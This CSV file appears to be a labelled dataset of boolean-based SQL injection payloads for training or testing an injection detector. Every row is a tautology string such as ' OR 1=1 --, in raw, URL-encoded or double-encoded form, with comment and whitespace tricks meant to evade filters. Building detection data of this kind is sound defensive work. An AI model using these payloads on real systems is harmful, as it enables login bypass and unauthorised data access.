payload,label,attack_type,variant_type,encoding_type,template_id,normalized_hash,payload_hash,length
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F2%3E1%2F%2A%2A%2F%23,1,sqli_boolean,comment_hash|ws_comment_ws,url_encoded,SQLI_BOOLEAN_001,c19cd366c1d071500ae515e5e5691f44,3bf093f71b77de4b8ceb6a7f1b9eb354,55
id%253D1%2527%2BOr%2B92%253D92%2B%253B--%2B-,1,sqli_boolean,case_var|comment_semicolon_comment,double_encoded,SQLI_BOOLEAN_006,a6da1a18bf708a92c1ad86bf865d33cb,bd3bb74b8b94b142095b23e6ba2fb7f2,44
id%3D1%27 OR+98=98+%23,1,sqli_boolean,comment_url_hash,partially_encoded,SQLI_BOOLEAN_006,b78b5f965f11a0a6d98733c308323210,cb7a241122496169235467f686725575,22
id=1' OR 16=16 #,1,sqli_boolean,comment_hash,raw,SQLI_BOOLEAN_006,f7e417a3420f80c6c57a6c24b85dcfc6,1388cf07890d2732e20f73d009004875,16
id%3D1%27%2520OR%2520NOT%2520%28100%3C200%29%2520--%2520-,1,sqli_boolean,comment_dash_dash_space|ws_url_space,url_encoded,SQLI_BOOLEAN_007,4b0a44f24f42b4ab2569a05c3f0eac94,fe13f8552050e7f4185152be52eaf1be,57
id%253D1%2527%252F%252A%252A%252For%252F%252A%252A%252FNOT%252F%252A%252A%252F%2528CHAR%252897%2529%253D%2527a%2527%2529%252F%252A%252A%252F--,1,sqli_boolean,case_var|comment_dash_dash|ws_comment_ws,double_encoded,SQLI_BOOLEAN_007,daa9d8ba726aab3b483955548fcef6ba,65fc49c8a95d07a38b8f1ffaccf0841a,142
id%3D1%27%2F%2A%2A%2FWhere%2F%2A%2A%2F1%3D1%2F%2A%2A%2FOr%2F%2A%2A%2FASCII%28%27A%27%29%3D65%2F%2A%2A%2F%2F%2A,1,sqli_boolean,case_var|comment_block_comment|ws_comment_ws,url_encoded,SQLI_BOOLEAN_008,30410d237dfc4b43d4323f12dcbe8b4f,72e425d613d2451fbcd04bc23c08acec,110
id=%271%27%2F%2A%2A%2FOR/%2A*/'88%27='88%27--,1,sqli_boolean,comment_dash_dash|ws_comment_ws,partially_encoded,SQLI_BOOLEAN_005,663a19543a72975490c44a7b2f7a2b28,f6d8daedd273fddcfce9d34acc24f165,45
id%3D1%27+OR+NOT+%28LENGTH%28%27test%27%29%3D4%29+%3B--+-,1,sqli_boolean,comment_semicolon_comment,url_encoded,SQLI_BOOLEAN_007,af5c9c0569b7ce863c3a03d9d7cc2c74,72b6b19c84ad9492541485fa81faa21a,57
id%3D1%27/*%2A/OR%2F*%2A%2FASCII(%27A')%3D65/%2A%2A%2F--,1,sqli_boolean,comment_dash_dash|ws_comment_ws,partially_encoded,SQLI_BOOLEAN_001,3538d41c5d9518aca17a14d34b004043,3a25ffd3b9c7d7266265ee80e301cf2a,56
id=1' OR 1=1 ;-- -,1,sqli_boolean,comment_semicolon_comment,raw,SQLI_BOOLEAN_001,5288d1816d46f9b27c0c153bf54f8105,08e59c24fe888ef035221e13d9f19560,18
username=admin'%20Or%20'a'='a'%20/*,1,sqli_boolean,case_var|comment_block_comment|ws_url_space,raw,SQLI_BOOLEAN_003,5d39ec096fe772c9bef8d2ecb9c684a8,68d2a417e70c16b102870cdc990da69b,35
id%3D1%27+WHERE+1%3D1+OR+7%3D7+%2F%2A,1,sqli_boolean,comment_block_comment,url_encoded,SQLI_BOOLEAN_008,2cc56490f5397368c61069a6569111ff,5fce6d20f7972b7d98ffcfb0fc6aca8d,37
id%253D%25271%2527%2509oR%2509%252784%2527%253D%252784%2527%2523,1,sqli_boolean,case_var|comment_hash|ws_tab,double_encoded,SQLI_BOOLEAN_005,772d050cef7a1597c3a9d262f23fc10d,0af4c84169a8aef84c8a6394ddb938c4,64
id%3D1'+AND+%27a'=%27a'+/*,1,sqli_boolean,comment_block_comment|ws_plus,partially_encoded,SQLI_BOOLEAN_002,33842b169e724ea9b807b30096e11f85,bfdbfc25fd400972122d1712f8ba8e10,26
id%3D1%27+Where+1%3D1+Or+ASCII%28%27A%27%29%3D65+%2523,1,sqli_boolean,case_var|comment_url_hash,url_encoded,SQLI_BOOLEAN_008,028782fcaf12dccf0d15fd76d4a6cc2e,d066e9fb5c9b4d693527877a0c5ecbfe,54
id%253D1%2527%2BOR%2BNOT%2B%2528CHAR%252897%2529%253D%2527a%2527%2529%2B%253B--%2B-,1,sqli_boolean,comment_semicolon_comment|ws_space,double_encoded,SQLI_BOOLEAN_007,01b6f673ef77b4cae3def1434d119f8b,2dcfd201e31a5e9c72efb20f38d50cff,83
id=1'  or  'a'='a'  #,1,sqli_boolean,case_var|comment_hash|ws_multi_space,raw,SQLI_BOOLEAN_001,8b15f742082172f189db6cb63b375e8d,3f426ac6c87aba7706628c149c4d9d82,21
id%3D%271%27+OR+%2764%27%3D%2764%27%2F%2A,1,sqli_boolean,comment_block_comment,url_encoded,SQLI_BOOLEAN_005,074eec1549e8226dadbcc8f012b5694d,320f367c91137b1fb6e06a773b6629a6,41
id=1%27 ++OR  +41%3D41+++#,1,sqli_boolean,comment_hash|ws_mixed_ws,partially_encoded,SQLI_BOOLEAN_006,e5ef871eb862c28645b4bddb02288350,1bb524402cbafb7c56201310ea383bfa,26
id%253D1%2527%2B%2BOr%2B%2B54%253D54%2B%2B%253B--%2B%2B-,1,sqli_boolean,case_var|comment_semicolon_comment|ws_multi_space,double_encoded,SQLI_BOOLEAN_006,22f2992b91af1c57b093b84cf257fed3,909159bde4adea85d0444f4286f30bdd,56
id%253D1%2527%2BOR%2B52%253D52%2B--%2B-,1,sqli_boolean,comment_dash_dash_space,double_encoded,SQLI_BOOLEAN_006,549cdd8cfe2672ee892b4ca2e1ed4538,f8e9a81b7b9f862852a185ea6193def4,39
id%253D1%2527%252F%252A%252A%252FOR%252F%252A%252A%252FNOT%252F%252A%252A%252F%2528%2527a%2527%253D%2527a%2527%2529%252F%252A%252A%252F--,1,sqli_boolean,comment_dash_dash|ws_comment_ws,double_encoded,SQLI_BOOLEAN_007,df25e99f1f656d8394aba0e4ed8c6f05,56914c498ff155f4020fc7979f434e48,137
id=1' AND 2>1 -- -,1,sqli_boolean,comment_dash_dash_space,raw,SQLI_BOOLEAN_002,baaf8d8427b3678caa9c72a3c2950557,2aa8e6a61d234976c3c5597da1af8a43,18
username%253Dadmin%2527%2BOR%2BCHAR%252897%2529%253D%2527a%2527%2B%252523,1,sqli_boolean,case_var|comment_url_hash|ws_space,double_encoded,SQLI_BOOLEAN_003,1fe4b55974d5351833cc3a82964e7686,1e7654874513fa84bbb00393f5d33942,73
id%253D1%2527%2BOR%2B%2528ASCII%2528%2527A%2527%2529%253D65%2529%2B%252F%252A,1,sqli_boolean,comment_block_comment,double_encoded,SQLI_BOOLEAN_004,f2b1e9d470f20f7bacf35847ae371eed,162a14b110fe31c499c2d5a32fd1f03c,77
id%253D1%2527%252BOR%252B73%253D73%252B%252F%252A,1,sqli_boolean,case_var|comment_block_comment|ws_plus,double_encoded,SQLI_BOOLEAN_006,0160e086379f5bd47e6d8d04575142c7,13f6639dfdee9e7c002b5e1464977b4d,49
id%3D1%27+OR+NOT+%282%3E1%29+%2523,1,sqli_boolean,comment_url_hash,url_encoded,SQLI_BOOLEAN_007,4d62ad697901d3fac7f823fd079c6331,3cc06f73870bc0e32e550f5b5b7a9cd2,34
id=1%27%2F**/AND%2F%2A*/100%3C200%2F%2A%2A/%2F*,1,sqli_boolean,comment_block_comment|ws_comment_ws,partially_encoded,SQLI_BOOLEAN_002,7912576a6f7cd61f982cc7ae92952d3e,e3dab11d91abf11ea3c32b61ffc1a0f3,47
id%3D1%27+Where+1%3D1+Or+2%3E1+%2523,1,sqli_boolean,case_var|comment_url_hash,url_encoded,SQLI_BOOLEAN_008,306f4da5691edb2d0517ec0f73312ad1,90d1ff1432d9b88b9be577dc4afad619,36
username%3Dadmin%27	OR	CHAR(97)%3D%27a%27	--,1,sqli_boolean,comment_dash_dash|ws_tab,partially_encoded,SQLI_BOOLEAN_003,58c7c29287b971328f707ff2495c5d57,fea66f415f31e9efae2f0dea66f8ef59,44
id%3D1%27 or+ASCII(%27A%27)%3D65 %2F%2A,1,sqli_boolean,case_var|comment_block_comment|ws_space,partially_encoded,SQLI_BOOLEAN_001,bb885a9d5204ab5483e2bbdc52057fb0,a17bde348e1e47525d7b9291d9b77d1a,39
id=1'+AND+100<200+#,1,sqli_boolean,comment_hash|ws_plus,raw,SQLI_BOOLEAN_002,f2adc1573706b77f2267768c17cabe26,f9b897e35a7603ffbe80c009ddacce03,19
id=1' Or 96=96 -- -,1,sqli_boolean,case_var|comment_dash_dash_space,raw,SQLI_BOOLEAN_006,fda2e3330ead1de0d2b73e5077e663d5,b584ee73dbec5f15b36f50c0f809aed1,19
id=1'%20oR%2031=31%20--%20-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_mixed_ws,raw,SQLI_BOOLEAN_006,bd022f55e8fadf0b6c1c4192b63f62b9,3b746e85610dac996ee6e4be667ffe89,27
id%253D1%2527%2BOR%2B7%253D7%2B%2523,1,sqli_boolean,comment_hash,double_encoded,SQLI_BOOLEAN_001,607f7040b2e50e8f60281739256da0ec,443dd1646846ffe9ee7a263182688ea2,36
username%3Dadmin%27+OR+1%3D1+%23,1,sqli_boolean,case_var|comment_hash,url_encoded,SQLI_BOOLEAN_003,cb343cb6d53e23da01542dc44f058c43,ef0f3dd8d7ebc4ba42442b91efa4ea64,32
id%3D%271%27%2BOR%2B%2760%27%3D%2760%27,1,sqli_boolean,case_var|ws_plus,url_encoded,SQLI_BOOLEAN_005,a2b88cdea451850dc1f560f1f3792fb8,b14063a506793a12a7b547f39532c19d,39
id%253D1%2527%252F%252A%252A%252FOr%252F%252A%252A%252F%25282%253E1%2529%252F%252A%252A%252F%253B--%252F%252A%252A%252F-,1,sqli_boolean,case_var|comment_semicolon_comment|ws_comment_ws,double_encoded,SQLI_BOOLEAN_004,50e5f7393d4a861fe227ad32430e272f,0f1043631c8788b1c404707497ace6e9,120
id%3D%271%27+Or+%2772%27%3D%2772%27,1,sqli_boolean,case_var,url_encoded,SQLI_BOOLEAN_005,a166704c13ee59801a66d4d77ca91916,df93016bc6167687e98cf6188c7e087c,35
id=1'+OR+21=21+%2F%2A,1,sqli_boolean,comment_block_comment|ws_plus,partially_encoded,SQLI_BOOLEAN_006,01718620593321ec58d64d0e28f8989d,38d5cc0cc7d58271d4370596979d48bc,21
id%3D1%27+OR+92%3D92+%3B--+-,1,sqli_boolean,comment_semicolon_comment,url_encoded,SQLI_BOOLEAN_006,a2a8c592df8028c9492c5cfe533fc8b8,4449658e71e857fb38d1cb23b8c0b61b,28
id%3D1%27+OR+(ASCII(%27A%27)%3D65)+/%2A,1,sqli_boolean,comment_block_comment,partially_encoded,SQLI_BOOLEAN_004,6b11c6076c8b69c6c559226099583603,c2b1d454e3c9df4c8fff87e812d9ed98,39
id%253D1%2527%252520OR%252520NOT%252520%2528100%253C200%2529%252520%2523,1,sqli_boolean,comment_hash|ws_url_space,double_encoded,SQLI_BOOLEAN_007,f59f105fc4d4909236ff5fb52ff943d6,eabc916ef35490610978b196a3bfc024,72
id%3D1%27+And+ASCII%28%27A%27%29%3D65+%3B--+-,1,sqli_boolean,case_var|comment_semicolon_comment,url_encoded,SQLI_BOOLEAN_002,2a15820466b8052d79ea916659e9aee1,6e454574ff11ae97942e010c1eef0f88,45
id%3D1%27%2520And%2520ASCII%28%27A%27%29%3D65%2520%3B--%2520-,1,sqli_boolean,case_var|comment_semicolon_comment|ws_url_space,url_encoded,SQLI_BOOLEAN_002,4fff0e8e70916cbc5077f49bab8a52ad,3c45655b24c6dd057d3ef81a27697d7a,61
id%3D1%27+and+ASCII(%27A')%3D65+--,1,sqli_boolean,case_var|comment_dash_dash|ws_mixed_ws,partially_encoded,SQLI_BOOLEAN_002,27ff134998577b9c0b673ee89151ccbd,3de76c8f1690b2503dd823658045efd6,34
id=1'+OR+NOT+(1=1)+/*,1,sqli_boolean,case_var|comment_block_comment|ws_plus,raw,SQLI_BOOLEAN_007,bef7ce4696085c2d92dc86aebea51219,9e120d5e800bb234fc2e2e6ba1b49a17,21
id%3D1%27%2520Where%25201%3D1%2520or%25201%3D1%2520%2523,1,sqli_boolean,case_var|comment_url_hash|ws_mixed_ws,url_encoded,SQLI_BOOLEAN_008,dee2e340d9d5abd2d6b4f1a46e7f865c,9e6d4bf780b132823cf6d6c43f21613f,56
id%253D1%2527%2Bor%2B%25287%253D7%2529%2B%2523,1,sqli_boolean,case_var|comment_hash|ws_space,double_encoded,SQLI_BOOLEAN_004,9d88b4852473f4810a34ce5f9c17d5cf,788e7532aa24f676e81a1e7f6615f9a9,46
id%3D%271%27++OR++%2773%27%3D%2773%27,1,sqli_boolean,ws_multi_space,url_encoded,SQLI_BOOLEAN_005,0176ce4d3254b7dffd4f7c71e38ba9f4,5c8d6c377822e6f3ec65e73cce7de4bb,37
id%253D%25271%2527%2B%2BOR%2B%2B%25272%2527%253D%25272%2527,1,sqli_boolean,ws_multi_space,double_encoded,SQLI_BOOLEAN_005,c0f58a64d39053871e2bd2647c427ad0,3b636115d1faf4169a48e135428f6150,59
id%3D1'	WHERE	1=1	OR	CHAR(97)=%27a'	--	-,1,sqli_boolean,comment_dash_dash_space|ws_tab,partially_encoded,SQLI_BOOLEAN_008,400bedc31b41fc8f722cf6faed8f7aa7,0d1a8658431dff5e5cbfa19c4830ca52,40
id%3D1%27+OR+96%3D96+%23,1,sqli_boolean,comment_url_hash|ws_plus,partially_encoded,SQLI_BOOLEAN_006,8734fa138b4eb204ec08379c5a7ba114,c7485841b80ed84a812337ac4a5a19e1,24
id%3D1' and 100<200+#,1,sqli_boolean,case_var|comment_hash,partially_encoded,SQLI_BOOLEAN_002,8b7e50f03483ea1947dc068bdada720a,57560e30aa56a0aad2de6eb4af389f9b,21
id%3D1%27+OR+NOT+%281%3D1%29+%2F%2A,1,sqli_boolean,comment_block_comment,url_encoded,SQLI_BOOLEAN_007,be4d7b1ed7aa0308658c414d62447ee8,96f1fea692c746d207e5aa649a1848e9,35
username%253Dadmin%2527%252BOr%252BLENGTH%2528%2527test%2527%2529%253D4%252B--,1,sqli_boolean,case_var|comment_dash_dash|ws_plus,double_encoded,SQLI_BOOLEAN_003,014812652b24fa3342899ffcf319dc96,628be1d39d4cea465ab9b249c7bd3c4c,78
id=1%27+AND+'a'=%27a%27+%23,1,sqli_boolean,comment_hash|ws_plus,partially_encoded,SQLI_BOOLEAN_002,67b57889657787beb1b96ad2aa51aed0,da64eb20addd9b5d451917d8f4a92671,27
id%3D%271%27%20Or%20'1%27%3D%271%27%23,1,sqli_boolean,case_var|comment_hash|ws_url_space,partially_encoded,SQLI_BOOLEAN_005,0ba12100bdfdb1a6a7227001a692abcf,3431a7ff49152fc7a238ae97dd63b051,38
id=1%27 +OR  68%3D68  %23,1,sqli_boolean,comment_url_hash|ws_multi_space,partially_encoded,SQLI_BOOLEAN_006,4614d4608c0012efcccf4405b42861f0,dd06964e7a0fcc68484fed6ec1704958,25
id%3D%271%27%2F%2A%2A%2FOR%2F%2A%2A%2F%2790%27%3D%2790%27%2523,1,sqli_boolean,comment_url_hash|ws_comment_ws,url_encoded,SQLI_BOOLEAN_005,ca3d5adfa242b0ce7d16bd37e4ddf4b2,d82fa7405ad1b4db0a344b4c6eda562f,62
id%253D1%2527%2509OR%250989%253D89%2509%2523,1,sqli_boolean,comment_hash|ws_tab,double_encoded,SQLI_BOOLEAN_006,960005df70a1e04ebe3f65157aaff09c,b45d55f4946cd4a8c563213a0ad93247,44
username%3Dadmin%27%09OR%09%27a%27%3D%27a%27%09%2F%2A,1,sqli_boolean,comment_block_comment|ws_tab,url_encoded,SQLI_BOOLEAN_003,533bbc33fec38bac939e238bbe1d8447,9b16f65a35312fb69437e93c0c8b45b8,53
id%3D1%27+OR+7%3D7+%2523,1,sqli_boolean,comment_url_hash,url_encoded,SQLI_BOOLEAN_001,b65dfdd4e5a7222527849738a76b9883,2499b1e58ae3bd37cc51a2cb6953e1b2,24
id%3D1%27 Where 1=1 OR LENGTH('test%27)%3D4+-- -,1,sqli_boolean,case_var|comment_dash_dash_space,partially_encoded,SQLI_BOOLEAN_008,adbefaaf0ca258a0b4c03feb4933883d,60f65aec9daca84386e799079f63e629,48
id=1' and+1=1+%23,1,sqli_boolean,case_var|comment_url_hash,partially_encoded,SQLI_BOOLEAN_002,5f03b0c9251b96923b08019695f8140f,759f4e0a09a778ada377a1772a6bd39a,17
id=1' where 1=1 or 100<200 #,1,sqli_boolean,case_var|comment_hash,raw,SQLI_BOOLEAN_008,43a24c8ed23441b08d9ff74d4fb529b1,a6101732a11d06af1f0fc946abe3a797,28
id%253D1%2527%2Bor%2B%2528100%253C200%2529%2B--%2B-,1,sqli_boolean,case_var|comment_dash_dash_space,double_encoded,SQLI_BOOLEAN_004,7c47e6eeffdd23e77ee2c36bfa5ad1a5,87cb69e86278be26563cf88c72913651,51
id%3D1%27+OR ('a'%3D%27a') --,1,sqli_boolean,comment_dash_dash,partially_encoded,SQLI_BOOLEAN_004,a969e201b95053328bc4084a4790c3cc,31422943b0004ea27494151c7a8be795,29
id%3D1%27%2520or%2520%282%3E1%29%2520%23,1,sqli_boolean,case_var|comment_hash|ws_url_space,url_encoded,SQLI_BOOLEAN_004,17d203d5c5da57b1b589b0b867671bb7,dbb4e640f3f680e56be669615f36332e,40
id%3D1%27+OR+NOT+%287%3D7%29+--,1,sqli_boolean,comment_dash_dash,url_encoded,SQLI_BOOLEAN_007,ce148059a48535082877be4cfbf1fbcf,57754e332e62df2dbf456721d1decd71,31
id%253D1%2527%2B%2B%2Bor%2B%2B%2B%25282%253E1%2529%2B%2B%2B%2523,1,sqli_boolean,case_var|comment_hash|ws_mixed_ws,double_encoded,SQLI_BOOLEAN_004,8847bf95b7c947f7850349944e50f29e,2ad827f21c697e2625b6a485db8f93c0,64
id%3D1%27++OR  CHAR(97)=%27a%27++;-- +-,1,sqli_boolean,comment_semicolon_comment|ws_multi_space,partially_encoded,SQLI_BOOLEAN_001,e0d48ba28ea4880795c6ac2b5c76007a,a7b449fcdbe4b06deb48fb2d81c95fc3,39
id%3D1%27+ Or+ %27a'%3D'a'  -- +-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_multi_space,partially_encoded,SQLI_BOOLEAN_001,b8288374400ea7909836438dfae38980,86bdba93ba31e2b752d95eeea5585d2e,33
id=1%27 or 3=3+#,1,sqli_boolean,case_var|comment_hash|ws_space,partially_encoded,SQLI_BOOLEAN_006,438f53b6b19552345b0914f4e46b2a1d,3cca1a1e58f25b6de583f94e3e485a20,16
id%3D1'	OR	NOT	(7%3D7)	--	-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_tab,partially_encoded,SQLI_BOOLEAN_007,160bfb94f1bc6f230cd4be5f6fd973dc,2bd6d4c74e4284f380dceca6d79aaefa,27
id=1%27 or NOT+(ASCII(%27A')%3D65)+--,1,sqli_boolean,case_var|comment_dash_dash,partially_encoded,SQLI_BOOLEAN_007,2ccf430d98fc03f290c49357bef064db,c8cfb5b8716cbd7c9641f08e74e8e070,37
id%3D1%27++OR++85%3D85++%3B--++-,1,sqli_boolean,case_var|comment_semicolon_comment|ws_multi_space,url_encoded,SQLI_BOOLEAN_006,99fd30d653b8e11b1d2d6cdf338bab1e,72e3f33c0b05f35ccde1f257e7be77f1,32
id=1%27%2F*%2A%2FAND%2F*%2A/ASCII(%27A')=65%2F%2A*%2F--,1,sqli_boolean,comment_dash_dash|ws_comment_ws,partially_encoded,SQLI_BOOLEAN_002,51d9b0b8330fef47861bec0f750ad423,786ce6b044385da758d0f5d65d8d574f,55
id%253D1%2527%252520OR%25252089%253D89%252520%252523,1,sqli_boolean,case_var|comment_url_hash|ws_url_space,double_encoded,SQLI_BOOLEAN_006,318fe7a931ffd84b8cdca36e13ed78b8,0fa2d1fac7eaf5c92e74e46fdf25f557,52
id%253D1%2527%252520OR%25252058%253D58%252520%253B--%252520-,1,sqli_boolean,case_var|comment_semicolon_comment|ws_url_space,double_encoded,SQLI_BOOLEAN_006,05dbe91926ee0ffeb9e79bd414a5a24e,a102ca46a66519224a4803d8a5721c5b,60
id='1'	OR	'9'='9',1,sqli_boolean,ws_tab,raw,SQLI_BOOLEAN_005,d25c07a8b20664e8b3c78fb1072cf357,e5aba9f269f29cd719ac11680a2f1757,17
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2FNOT%2F%2A%2A%2F%28%27a%27%3D%27a%27%29%2F%2A%2A%2F%3B--%2F%2A%2A%2F-,1,sqli_boolean,comment_semicolon_comment|ws_comment_ws,url_encoded,SQLI_BOOLEAN_007,e66ab6d4c6878724184a483f9da382de,711637527953a74dbc953c2ca5c6c553,103
id%3D1%27+where+1%3D1+or+1%3D1+%2523,1,sqli_boolean,case_var|comment_url_hash|ws_space,url_encoded,SQLI_BOOLEAN_008,6e4b1af504919f6bf43c2bc28496dcb3,1808024495618e759102dcb20451520e,36
id%3D1%27%2520or%25202%3E1%2520%2F%2A,1,sqli_boolean,case_var|comment_block_comment|ws_mixed_ws,url_encoded,SQLI_BOOLEAN_001,8ee79c54d147a7b207d4f2cb1e0e6adc,5009757a158afb52400a1ffeee261cf6,37
id%3D%271%27+Or+%2765%27%3D%2765%27,1,sqli_boolean,case_var,url_encoded,SQLI_BOOLEAN_005,8d1ff4dabdcc60379146258eb802e55f,935c11c4f879bbfd08f9680e03b84517,35
id%3D1%27%09Or%0963%3D63%09%2523,1,sqli_boolean,case_var|comment_url_hash|ws_tab,url_encoded,SQLI_BOOLEAN_006,15e90cda033b3086b470b7e0e287d91d,2b97d803b08a19d006b26db1c0507396,32
id%3D1' or (CHAR(97)%3D'a')+%23,1,sqli_boolean,case_var|comment_url_hash,partially_encoded,SQLI_BOOLEAN_004,1d1eaffb8c8371deba8498eb0d44bd12,3d6c779a2dd0500929d205dfc4f70829,31
username%3Dadmin%27%20OR%20CHAR(97)%3D'a%27%20/%2A,1,sqli_boolean,comment_block_comment|ws_url_space,partially_encoded,SQLI_BOOLEAN_003,b91ba18eec783343e32d3403edb8f8cf,6cafeba0aa23ea61624db6668f62550c,50
username%3Dadmin%27+oR+%27a%27%3D%27a%27+--,1,sqli_boolean,case_var|comment_dash_dash,url_encoded,SQLI_BOOLEAN_003,3f42252803091e978c9ad3988199f097,e868aa10f970c8e2e4bf74df53f256be,43
id%3D1%27+OR+15%3D15+--,1,sqli_boolean,comment_dash_dash,url_encoded,SQLI_BOOLEAN_006,a055f91d071b598ad02a5c146c9440cf,d57bc1ac0444a4a2bf2561db79fc0c50,23
id%3D1%27+OR+83%3D83+%3B--+-,1,sqli_boolean,comment_semicolon_comment,url_encoded,SQLI_BOOLEAN_006,9f2b74eb5955829ce57fe9b5ba44fd6d,c264cd9f7cc5281a4cafc74904ca0fcd,28
id=1'%20or%20(CHAR(97)='a')%20--,1,sqli_boolean,case_var|comment_dash_dash|ws_url_space,raw,SQLI_BOOLEAN_004,e057a5af4b1a5f9587796944cabe0302,2605bccada4d964d462de10a1b16b609,32
id='1'/**/oR/**/'45'='45',1,sqli_boolean,case_var|ws_comment_ws,raw,SQLI_BOOLEAN_005,215f375e286210c4df821702ffb3ddbd,3df204f0e0d07577f86c37b7c4e09d2f,25
id%253D1%2527%2509or%2509%2528100%253C200%2529%2509%252523,1,sqli_boolean,case_var|comment_url_hash|ws_tab,double_encoded,SQLI_BOOLEAN_004,09c74bfd5b7fdaf46dc6aaf0a8aef941,6a4ccab3bea6420d5f38e7a64bd94c74,58
id%3D%271%27%09Or%09%2794%27%3D%2794%27%23,1,sqli_boolean,case_var|comment_hash|ws_tab,url_encoded,SQLI_BOOLEAN_005,1174c9b35dd8f7555db7f0899da31abb,074100373f98f534f4c22c2ff786a362,42
id%3D1%27%09Or%092%3D2%09--%09-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_tab,url_encoded,SQLI_BOOLEAN_006,7f0ac3dd83ded5bbb8a98fedd595734c,954a2138fac1951eb8aca98f875fd715,31
id%3D%271%27+Or+%2716%27%3D%2716%27,1,sqli_boolean,case_var,url_encoded,SQLI_BOOLEAN_005,8fe955d2ef7fd7597dc0ea3fce7a9eb0,285abe541f99e5dae59eb710a1bcb3a5,35
username%3Dadmin%27+oR+%27a%27%3D%27a%27+%3B--+-,1,sqli_boolean,case_var|comment_semicolon_comment,url_encoded,SQLI_BOOLEAN_003,a667cb542e7f7bf2a36747390543491f,c12845111dbde1693cb847b7f7f19d4d,48
id%253D%25271%2527%2Bor%2B%252799%2527%253D%252799%2527,1,sqli_boolean,case_var,double_encoded,SQLI_BOOLEAN_005,de88b4e2584bee15013f6f070a5dd591,bfc27e790956e2b1cea702af59cf5a16,55
id%253D%25271%2527%2Bor%2B%252759%2527%253D%252759%2527%252523,1,sqli_boolean,case_var|comment_url_hash,double_encoded,SQLI_BOOLEAN_005,26d36dea1aaacf99f3adc1dfe788d963,6a45f27e896876b5ff49f4237f3bcbb2,62
id%253D1%2527%2BwhERE%2B1%253D1%2Bor%2BASCII%2528%2527A%2527%2529%253D65%2B--,1,sqli_boolean,case_var|comment_dash_dash,double_encoded,SQLI_BOOLEAN_008,bd660ac2db4970eb615c19f6ebc30b15,75ffe7df5db5211753cb9245257b94b2,77
id%3D%271%27%2Bor%2B%2734%27%3D%2734%27,1,sqli_boolean,case_var|ws_mixed_ws,url_encoded,SQLI_BOOLEAN_005,755dcc443ff05cc2f89f76ec0d7bc9c3,83c89736dec0c5a728ee54b76ef71387,39
id=1'+Or+LENGTH('test')=4+%23,1,sqli_boolean,case_var|comment_url_hash|ws_mixed_ws,raw,SQLI_BOOLEAN_001,f4c5b7a1c077651c386936d87bb5beff,2e5c45e190e468af5978ec6b3fe44132,29
id%253D1%2527%252520where%2525201%253D1%252520Or%252520LENGTH%2528%2527test%2527%2529%253D4%252520--%252520-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_url_space,double_encoded,SQLI_BOOLEAN_008,3a4ccc8e25cb8ace48edc17d929ce871,31c7ac82112f338ce0f9393d0cfc73f9,108
id%3D1%27%2Band%2BCHAR%2897%29%3D%27a%27%2B--%2B-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_plus,url_encoded,SQLI_BOOLEAN_002,982917108aff81c6538cce27161a9dac,5ad772a261bef73df509a649795bd756,49
id%253D1%2527%2BOR%2B83%253D83%2B%252F%252A,1,sqli_boolean,comment_block_comment,double_encoded,SQLI_BOOLEAN_006,d57258fffd548f3dc598cd8fd4c20db6,2788a4678b8a28c43b8e316e369a84d8,43
id='1' Or+%2728%27=%2728',1,sqli_boolean,case_var,partially_encoded,SQLI_BOOLEAN_005,12e1588fe7358e318d4010fc29161c20,24bfd0bb0608e4bd35cf6900ee0da65e,25
id=1' or (CHAR(97)='a') -- -,1,sqli_boolean,case_var|comment_dash_dash_space|ws_space,raw,SQLI_BOOLEAN_004,a322324e9bd38d76b4d6966cc0759658,4e7e5b2c61076513f765231741998acd,28
id%3D1%27	Or	99=99	%2F%2A,1,sqli_boolean,case_var|comment_block_comment|ws_tab,partially_encoded,SQLI_BOOLEAN_006,d2c5375c0943722d68c9dbccc19b06ac,4ca26d86c2454a04133ec2b4b8bc0399,25
id%3D1%27%2520WHERE%25201%3D1%2520OR%25201%3D1%2520--,1,sqli_boolean,comment_dash_dash|ws_url_space,url_encoded,SQLI_BOOLEAN_008,2cba99ba51fb7092245a3d7e705b2f60,14b8ea178774c19333b900d3c8f50714,53
id=1'+OR+96=96+--+-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_plus,raw,SQLI_BOOLEAN_006,3cdc779c048df634a15a854af66d117a,a0d1045ec383774afca316946214bcd9,19
